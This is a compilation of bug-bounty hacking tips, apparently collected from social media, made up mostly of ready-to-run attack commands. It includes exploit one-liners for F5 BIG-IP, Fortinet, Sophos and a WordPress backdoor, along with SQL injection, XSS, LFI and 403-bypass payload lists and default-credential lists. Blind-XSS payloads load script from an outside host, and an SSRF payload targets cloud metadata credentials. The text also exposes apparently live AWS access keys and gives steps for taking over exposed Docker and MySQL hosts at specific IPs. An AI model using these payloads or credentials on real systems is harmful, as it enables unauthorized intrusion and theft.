	
---------------------------------------------------------------------------------------------


bxss google dorks 

site:*.target.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form" 

----------------------------------------------------------------------------------------------

Want to do dir bruteforcing and parameter bruteforcing at the same time?

GET
ffuf -w "./dir.txt:DIR" -w ./params.txt -u https://EXAMPLE(.)COM/DIR?FUZZ=1 -t 300 -ac

POST
ffuf -w "./dir.txt:DIR" -w ./params.txt -u https://EXAMPLE(.)COM/DIR -X POST -d "FUZZ=1" -t 300 -ac

----------------------------------------------------------------------------------------------

CVE-2022-1609 WordPress Weblizar  Backdoor

$ curl -s -d 'blowfish=1' -d "blowf=system('id');" 'http://localhost:8888/wp-json/am-member/license'

uid=33(www-data) gid=33(www-data) groups=33(www-data)

----------------------------------------------------------------------------------------------

Turn your P5 into a P1
1) nuceli -u https://example(.)com -t exposures/configs/git-config.yaml
2) git clone https://github.com/internetwache/GitTools.git
3) ./gitdumper.sh https://example(.)com/.git/ /tmp/gitdump
4) ./extractor.sh /tmp/gitdump /tmp/gitdumpext
5) trufflehog filesystem /tmp/gitdumpext

----------------------------------------------------------------------------------------------

Chaining file uploads with other vulnerabilities by setting the filename✅:
▶️../../../tmp/lol.png -> for path traversal
▶️sleep(10)-- -.jpg -> for SQL injection
▶️<svg onload=alert(document.domain)>.jpg/png -> for XSS
▶️; sleep 10; -> for cmd inject

----------------------------------------------------------------------------------------------

#DomainTakeover #oneliner #bugbountytips 
> Don't always check only on third-party services.
> Check manually if target pointing CNAME Domain is available for buy or not.
> cat live-domains.txt | while read domains;do dig $domains;done | grep CNAME
Thanks to 
@Virdoex_hunter

----------------------------------------------------------------------------------------------

Shodan Dorks for Finding Sensitive Data

➡"MongoDB Server Information" port:27017 -authentication

➡"authentication disabled" "RFB 003.008"

➡"X-Jenkins" "Set-Cookie: JSESSIONID" http.title:"Dashboard"

➡"Set-Cookie: mongo-express=" "200 OK"

----------------------------------------------------------------------------------------------

Bug Bounty Hint
Signup

Try multiple emails on password reset and check your both email accounts for a mail.

🔹 email=victim&email=attacker
🔹 email[]=victim&email[]=attacker
🔹 email=victim,attacker
🔹 {email: victim, email:attacker}
🔹 {email: [victim,attacker]}


--------------------

# Email Address input fuzz

"><script src=https://egg.xss.ht></script>
test+(<script>alert(1)</script>)@example.com
test@example(<script>alert(1)</script>).com
"<script>alert(1)</script>"@example.com

"<%=7*7%>"@example.com
test+(${{7*7}})@example.com

"'OR 1=1--"@example.com
"mail');DROP TABLE users;--"@example.com

test@example.burpcollaborator.net
test@[127.0.0.1]

victim&email=attacker@example.com

"%0d%0aContent-Lenght:%200@0d%0a%0d%0a"@example.com"recipient@test.com>\r\nRCPT TO:<victim+"@test.com



----------------------------------------------------------------------------------------------

Account takeover tips
1.Create an account
2.For the attacker and the victim to 
3.Reset password

{
"email":"victim",
"email":"attacker";
}

----------------------------------------------------------------------------------------------

#bugbountytip
Inject In Url Its Self Without any Parameter

Payload was Here
/0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z/
as This In Url so We Have [Multiple SQL Injection] 😎

----------------------------------------------------------------------------------------------

I. Find admin login panel on Shodan
ssl:"[redacted]" 401

Replace [redacted] with trade name, example: "Yahoo Inc" (Don't put any comma here)

II. Try Default Credentials Every Login Panel .
In My Case
Username: Administrator
Password: Administrator

Additional tips: try some of the following credentials

admin:admin
admin:a
admin:12346578
test:test
guest:guest
anonymous:anonymous
admin:password
admin:
root:toor
root:passw0rd
root:root
guest:test
$sub_name:password
ADMIN:ADMIN
Admin:Admin
:
a:a

----------------------------------------------------------------------------------------------

thanks to 
@GodfatherOrwa
 write up  now we can automate this using 
@ofjaaah
 tip 
uncover -q '"X-ORACLE-DMS-ECID" http.title:”Login”' | httpx -silent | nuclei -t /root/nuclei-templates/misconfiguration/oracle-ebusiness-registration-enabled.yaml

----------------------------------------------------------------------------------------------

403 Forbidden bypass 🔥🔥

GET /admin ==> 403 Forbidden
GET /blablabal/%2e%2e/admin ==> 200 OK
GET /blablabal/..;/admin ==> 200 OK 
GET /blablabal/;/admin ==> 200 OK
GET /blablabal/admin/..;/ ==> 200 OK
GET /admin?access=1 ==> 200 OK 

----------------------------------------------------------------------------------------------
When you see jira confluence try CVE-2021-26085
----------------------------------------------------------------------------------------------

RCE in Sophos Firewall (CVE-2022-1040) 
Cc 
@Dinosn
@ExWareLabs
 
curl -sk -H "X-Requested-With: XMLHttpRequest" -X POST 'hxxps://x.x.x.x/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"x":"test"\}' | grep -q 'Session Expired'

----------------------------------------------------------------------------------------------
Spring4Shell-Poc - Spring Core RCE 0-day Vulnerability https://ift.tt/tqfuWdQ 
----------------------------------------------------------------------------------------------

CVE-2022-1040_checker

cat sophos_servers | while read host do; do curl --connect-timeout 10 -ks -H "X-Requested-With: XMLHttpRequest" -X POST "https://$host/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"x":"TEST"\}" | grep -q 'Session Expired' ; done

----------------------------------------------------------------------------------------------

Spring4Shell 
@pdnuclei

templates https://github.com/justmumu/SpringShell… Log4j 
@pdnuclei

templates https://github.com/trickest/log4j All here :-

----------------------------------------------------------------------------------------------
F5 BIG-IP iControl RCE (CVE-2021-22986)

execute arbitrary system commands
create or delete files
disable services

PoC #1
curl -su admin: -H "Content-Type: application/json" http://[victimIP]/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}'

https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986


PoC #2
curl -ks https://[victimIP]/mgmt/shared/authn/login -d '{"bigipAuthCookie":"","loginReference":{"link":"http://localhost/mgmt/tm/access/bundle-install-tasks"},"filePath":"`id`"}'


PoC #3
curl -ksu admin:[redacted] https://[vimtimIP]/mgmt/tm/access/bundle-install-tasks -d '{"filePath":"id"}'


#bugbountytips #blindxss

----------------------------------------------------------------------------------------------
Scan for F5 BIG-IP iControl REST Auth Bypass RCE (CVE-2022-1388) using nuclei template shared by 
@dwisiswant0

./nuclei -u http://big-ip.local -id CVE-2022-1388 -vv

----------------------------------------------------------------------------------------------
scan for Exploit-F5-CVE-2022-1388  >> multi subdomains

cat ips.txt | while read ip; do curl -H "Host: localhost:8100" -H "Content-Type: application/json" -H "Connection: keep-alive, X-F5-Auth-Token X-F5-Auth-Token: a" -H "Authorization: Basic YWRtaW46" \  http://$ip/mgmt/tm/util/bash \ -d '{"command":"run","utilCmdArgs":"-c id"}';done


or single domain

echo <ip> | while read ip; do curl -H "Host: localhost:8100" -H "Content-Type: application/json" -H "Connection: keep-alive, X-F5-Auth-Token X-F5-Auth-Token: a" -H "Authorization: Basic YWRtaW46" \  http://$ip/mgmt/tm/util/bash \ -d '{"command":"run","utilCmdArgs":"-c id"}';done

----------------------------------------------------------------------------------------------
#CVE
CVE-2022-1388
F5 BIG-IP Unauthenticated #RCE Vulnerability

#POC
Use POST request to execute "cat /etc/passwd" command

#Shodan: 
http.title:"BIG-IP&reg;-+Redirect" +"Server" 
 
#Nuclei:
https://github.com/projectdiscovery/nuclei-templates/pull/4303/files

----------------------------------------------------------------------------------------------
In several of these programs, a simple trick that I use to great success is finding copyright and trademark text. For example:

"© Copyright, XYZ1212 Company, 2020" on Google.

Then use the minus operator like:

"© Copyright, XYZ1212 Company, 2020" -xyz1212.com

----------------------------------------------------------------------------------------------

when you found atlassian Confluence version before 7.13.0 try CVE-2021-26085 (path traversal)

POC : https://example.com/s/cfx/_/;/WEB-INF/web.xml

Severity: 5.0 medium

#bugbounty #bugbountytips

----------------------------------------------------------------------------------------------
Thanks 
@GodfatherOrwa

1. Find company *trade name* used on certificate 

curl -s https://crt.sh\?O\=\%.[CompanyName]\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

2. Find admin login panel on Shodan

ssl:"[TradeName]" 401

3. Check dns name on certificate

http://companyenroll.redacted.com

4. Login with weak username/password pair

Username: companyenroll
Password: companyenroll

#BugBounty 
----------------------------------------------------------------------------------------------
Firstly make a Full port scanning then run it 
@pdnuclei
@0xmahmoudJo0

command: 
rustscan -a 'IPs' -r 1-65535 --ulimit 5000 | grep Open | tee open_ports.txt | sed 's/Open //' | ./httpx -silent | ./nuclei -t ~/nuclei-templates/ -s low,medium,high,critical -stats

#bugbountytips #BugBounty #CyberSecurity

----------------------------------------------------------------------------------------------
Easy XSS anyone ? 🔥
method 1
cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 

method 2
waybackurls http://testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'

https://github.com/R0X4R/bhedak
https://github.com/ferreiraklet/airixss
https://github.com/ameenmaali/urldedupe

#bugbounty #oneliner #bugbountytips
----------------------------------------------------------------------------------------------
Search in #github repo for creds/apikey/secrets using #nuclei template.

Command : 
git clone https://github.com/zricethezav/gitleaks.git | nuclei -target ./ -t ~/Desktop/secrets-in-files.yaml

https://github.com/.../blob/main/file/secrets-in-files.yaml
tip : you can use the same template to examine scripts/js files/file system


------------------------------------------------------------------------------------------------


./uncover -q 'org:"University of California, Los Angeles"' | cut -d ":" -f 1 | ./httpx -silent | ./nuclei -id CVE-2022-26134 -vv

./nuclei -l subdomains - t nuclei-templates/ -stats -outtttttttt -s low,medium,high,critical


Hidden Paramters "Arjun + this worlist >> wget https://wordlists-cdn.assetnote.io/data/automated/httparchive_js_2020_11_18.txt"
wget https://wordlists-cdn.assetnote.io/data/automated/httparchive_apiroutes_2021_01_28.txt
wget https://raw.githubusercontent.com/Iir00d/low_hanging_fruit_list/main/list.txt

-------------------------------------------------------------
s3bucket
git clone https://github.com/0xmoot/s3sec
cat subdomains | python3 s3sec.py

pip3 install awscli

https://aws.amazon.com/free/?all-free-tier.sort-by=item.additionalFields.SortRank&all-free-tier.sort-order=asc

aws configure

AWS Access Key Id: AKIAVRIHSBPKN3LWL26J 
AWS Secret Access Key: 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 
Default region name: ap-south-1
Default output format: json

-------------------------------------------------------------
bypass403
go get -u github.com/m4dm0e/dirdar
cat subdomains | dirdar
------------------------------------------------------------
dirsearch
sudo apt update && sudo apt install -y feroxbuster
OR
curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/master/install-nix.sh | bash

cat subdomains | feroxbuster --depth 2 --wordlist seclist


for URL in $(<subdomains); do ./feroxbuster --url "${URL}" -k --depth 2 --wordlist SecLists-master/Discovery/Web-Content/common.txt ; done

-------------------------------------------------------------

JAVA

Log4jScanner:-
pip3 install Log4jScanner
python3 http://Log4jScanner.py -m subdomains --th 500 -c canarytokens -f db/headers-large.txt



log4j
shodan : EXTJS 4.1.3
%24%7Bjndi:ldap://%24%7BhostName%7DXXXX%24%7B::-.%http://7Dburpcollaborator.net%7Dzzzz


1:- You can use httpx to find the technology and grep for Java.
2:- Save the file and feed it to nuclei -tags log4j,And send every request to Burpsuite.
3:- Try this log4j payload gist,feed it to intruder with your collaborator client.

-----------------------------------------------------------------


SSRF in Jira at this End Point

plugins/servlet/oauth/users/icon-uri?consumerUri=http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/



---------------------------------------------------------------------------------------------------------------
enum subdomains

curl -s https://crt.sh\?O\=\%.[CompanyName]\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

inurl:"https://deliveroo" intitle:deliveroo
inurl:"https://www.deliveroo" intitle:deliveroo
site:http://groups.google.com "$COMPANY"


--------------------------------------------------
~ Finding hidden servers/Admin panels
>> cmd
wget https://raw.githubusercontent.com/cujanovic/Virtual-host-wordlist/master/virtual-host-wordlist.txt

$ ffuf -c -l subdomains -H "Host: FUZZ" -w vhost_wordlist.txt

---------------------------------------------------
~ Getting subdomains from IP’s
>> cmd
$ python3 http://hosthunter.py <target-ips.txt> > vhosts.txt

-------------------------------------------------------
~ Removing duplicate URLs and parameter combinations
>> cmd
$ cat urls.txt | qsreplace -a

--------------------------------------------------------
one line to get admin login page or panel
>> cmd

$ wget https://raw.githubusercontent.com/the-robot/admin-finder/master/wordlist.txt

$ cat subdomains | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"

OR

$ cat subdomains| httpx -ports 80,443,8080,8443 -path "wordlist.txt" -mr "password"

---------------------------------------------------------


cat subdomains | ./httpx -silent -p 80,443,8080,8443,9000,9001,9002,9003 -nc  | ./nuclei -t nuclei-templates/ -s low,medium,high,critical -silent | tee -a BugsFound.txt



rustscan -a 'IPs' -r 1-65535 --ulimit 5000 | grep Open | tee open_ports.txt | sed 's/Open //' | httpx -silent | nuclei -t ~/nuclei-templates/



cat target | httpx -path /plesk-stat/webstat -status-code -title


#bugbountytips 
command injection vulns
fetch all sub-domain and save it to file.txt
after use this
One command line 
~ cat file.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id"  -mr "uid=" -v -status-code

------------------------------------------------------------------



SQLi-TimeBased scanner

cat gau | sed 's/=[^=&]*/=';WAITFOR DELAY '0:0:5'--/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done


---------------------------------------------------------


ffuf -w "./dir.txt:DIR" -w ./params.txt -l Urls.txt/DIR?FUZZ=javascript:alert(1) -t 300 -ac -mr "javascript:alert(1)" 


-----------------------------------------------------------


./ffuf -w wordlist:W1 -w wordlist:W2 -l subdomains/W1/W2 -e php,asp,aspx,txt,csv,xls,xlsx,txt,bak,zip,sql -mc 302 -mode clusterbomb



------------------------------------------------------------

cat wayback | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'

https://github.com/R0X4R/bhedak
https://github.com/ferreiraklet/airixss
https://github.com/ameenmaali/urldedupe

----------------------------------------------------------------
Trick pro xss

cat wayback | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done

------------------------------------------------------------------

Want to do dir bruteforcing and parameter bruteforcing at the same time?

GET
ffuf -w "./dir.txt:DIR" -w ./params.txt -l Urls.txt/DIR?FUZZ=1 -t 300 -ac

POST
ffuf -w "./dir.txt:DIR" -w ./params.txt -l Urls.txt/DIR -X POST -d "FUZZ=1" -t 300 -ac



----------------------------------------------------------------------------------------------------


This is how I found a open redirection. 
Tips:
1)  Used Gau To Get All The URLS
2) Used grep =http Filtered Only URLS with Parameter has http
3) Check these urls manually
4) Boom!
cat domain.txt | gau | grep "=http" | tee out.log

-------------------------------------------------------------------

Blind XSS at scale 🔥🔥🔥

cat gf_xss | ./httpx -H "User-Agent: \"><script src=http://egg.xss.ht></script>" 

And monitor your xss hunter dashboard 🔥🔥🔥
-----------------------------------------------

Apk

 So I collected all the applications and decompiled them all at once with apktool with this command: 

 >>	find . -iname “*.apk” -exec apktool d -o {}_out {} \;

 >>	nuclei -target /path-to-output-folder/”android testing”/allapks/ -t /path-to-tamplates/mobile-nuclei-templates/


Links :
Nuclei: https://github.com/projectdiscovery/nuclei Thanks to projectdiscovery
Android templates for nuclei: https://github.com/optiv/mobile-nuclei-templates
APKTOOL: https://github.com/iBotPeaches/Apktool


---------------------------------------------------------------
nmap 

rustscan -a 54.73.77.163 -r 1-65535 --ulimit 5000

nmap -A -p0-65535 54.73.77.163 -Pn


nmap -sV --script=rdp-vuln-ms12-020 -p 3389 54.73.77.163



if you found
	3306/tcp mysql open

	┌──(omar㉿kali)-[~]
	└─$ mysql -h 27.115.70.253 -u root -P 3306


	Brute Spray from github

	wordlist user:pass for sql
	wget https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt

	┌──(omar㉿kali)-[~]
	└─$ brutespray - file nmap-output.xml - service mysql - threads 5



	┌──(omar㉿kali)-[~]
	└─$ searchsploit ‘mysql’|egrep ‘native|pass|auth|5.5’

	There is no public exploit for the plugin “mysql_native_password”


if you found
	2375/tcp docker open

	docker -H <host>:<port> ps

	┌──(omar㉿kali)-[~]
	└─$ docker -H 180.232.66.9:2375 ps

	docker -H <host>:<port> exec -it <container name> <command>

	┌──(omar㉿kali)-[~]
	└─$ Docker -H orange.es:2375 -it ‘limpid_agelast’ exec /bin/bash

	id

-----------------------------------------------------------------------------------

Full port scan

#!/usr/bin/bash
 
while read ip;
do echo "nmap -n -Pn -sS -g 53 --stats-every 3m --max-retries 1  --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 $service $ip -oN $ip-tcp.txt" >> cmd_tcp.txt 
done < live_hosts.txt


-------------------------------------------

Some filter bypass payload list while hunting for LFi vulnerability✅

👇🔥
#bugbountytips #infosec 
→index.php?page=....//....//etc/passwd
→index.php?page=..///////..////..//////etc/passwd
→index.php?page=/var/www/../../etc/passwd


--------------------------------------------------------


subfinder -d http://site.com | httpx -t 1000 -rl 1000 -path /info.php -mc 200 | grep -i 200

----------------------------------------------------------


New 403 Bypass 🔥🔥🔥🔥
Download.php?file=../config.php ==> 403

Download.php?file=. /config.php⨀ ==> 200
Download.php?file=⊡ /config.php⨀  ==> 200
Download.php?file= .⊡ /config.php  ==> 200
Credit: 
@HusseiN98D
 
-------------------------------------------------------

CVE-2022-40684

ffuf -w "subdomains:URL" -u "https://URL/api/v2/cmdb/system/admin/admin" -X PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";' -d '{"ssh-public-key1": "h4x0r"}' -mr "SSH" -r

----------------------------------------------------------

#bugbountytips

403 Forbidden bypass ✍️

GET /admin = 403 Forbidden
GET /random-dir/../admin = 200 OK 

Cloudflare IP Restriction bypass ✍️

GET /admin = Error 1006 (Cloudflare)
GET /admin? = 200 OK

--------------------------------------------------

SSRF on Image upload

If the paramater value in the request of image upload starts with 'data:' replace it with your burp collaborator

----------------------------------------------------------

Bypass 403🎆 #bugbountytips 

➡Using "X-Original-URL" header
➡Appending %2e after the first slash 
➡Try add dot (.) slash (/) and semicolon (;) in the URL
➡Add "..;/" after the directory name
➡Try to uppercase the alphabet in the url


🏹Using "X-Original-URL" header : 
. . .
Request : 
GET /admin HTTP/1.1
Host: http://target.com

Try this to bypass with
. . .
GET /anything HTTP/1.1
Host: http://target.com
X-Original-URL: /admin



🏹Appending %2e after the first slash
. . .
Request :
http://target.com/admin => 403

Try to Bypass with
. . .
http://target.com/%2e/admin => 200




🏹Try add dot (.) slash (/) and semicolon (;) in the URL
. . .
http://target.com/admin => 403

Try to Bypass with 
. . .
http://target.com/secret/. => 200
http://target.com//secret// => 200
http://target.com/./secret/.. => 200
http://target.com/;/secret => 200
http://target.com//;//secret => 200




🏹Add "..;/" after the directory name
. . .
http://target.com/admin => 403

Try this to bypass using ..;/
http://target.com/admin..;/ => 200



🏹Try to uppercase the alphabet in the url
. . .
http://target.com/admin => 403

Try with UPPERCASE :
http://target.com/aDmIN => 200


🏹Via Web Cache Poisoning
. . .

GET /anything HTTP/1.1
Host: http://victim.com
X­-Original-­URL: /admin